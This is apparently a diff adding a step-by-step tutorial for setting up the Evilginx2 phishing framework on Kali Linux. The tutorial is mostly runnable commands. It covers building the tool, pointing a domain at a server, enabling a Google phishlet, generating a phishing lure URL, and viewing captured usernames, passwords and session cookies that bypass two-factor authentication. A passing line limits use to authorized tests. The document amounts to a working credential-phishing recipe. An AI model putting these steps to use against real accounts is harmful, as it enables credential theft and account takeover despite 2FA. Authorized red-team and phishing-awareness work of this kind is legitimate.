@@ -1,0 +1,93 @@
+Step-by-Step: Using Evilginx2 in Kali Linux
+1️⃣ Install Dependencies
+
+First, make sure your system is up to date and has Go installed:
+
+sudo apt update && sudo apt upgrade -y
+sudo apt install git make gcc -y
+sudo apt install golang -y
+
+2️⃣ Download & Install Evilginx2
+git clone https://github.com/kgretzky/evilginx2.git
+cd evilginx2
+make
+sudo make install
+
+
+After installation, you can run:
+
+evilginx
+
+3️⃣ Configure a Domain
+
+Evilginx2 works by creating phishing pages under your own domain name.
+You need:
+
+A registered domain (e.g., example.com)
+
+A VPS or server with a public IP
+
+DNS A records pointing subdomains to your server
+
+Example DNS records:
+
+phish.example.com  →  your_server_IP
+www.example.com    →  your_server_IP
+
+4️⃣ Set Up Evilginx2
+
+Inside Evilginx2:
+
+config domain phish.example.com
+config ip your_server_IP
+
+
+Enable HTTP to HTTPS redirection:
+
+config redirect_https true
+
+5️⃣ Install Phishlets
+
+Phishlets are templates for specific sites (e.g., Google, Facebook, Office365):
+
+phishlets
+phishlets enable google
+
+
+To view available phishlets in your Evilginx2 setup:
+
+phishlets get-hosts google
+
+
+Update your DNS records according to the required hostnames.
+
+6️⃣ Start the Lure (Phishing Link)
+lures create google
+lures get-url 0
+
+
+This URL is the phishing link you send only in an authorized test.
+
+7️⃣ Capture Sessions
+
+Once the target logs in through the phishing page, Evilginx2 will store:
+
+Username
+
+Password
+
+Session cookies (for bypassing 2FA)
+
+View captured data:
+
+sessions
+
+8️⃣ Stop & Exit
+
+When done:
+
+exit
+
+
+💡 Tip for Testing in a Lab
+If you don’t want to buy a domain, you can simulate Evilginx2 on a local network using /etc/hosts file redirection and self-signed certificates.
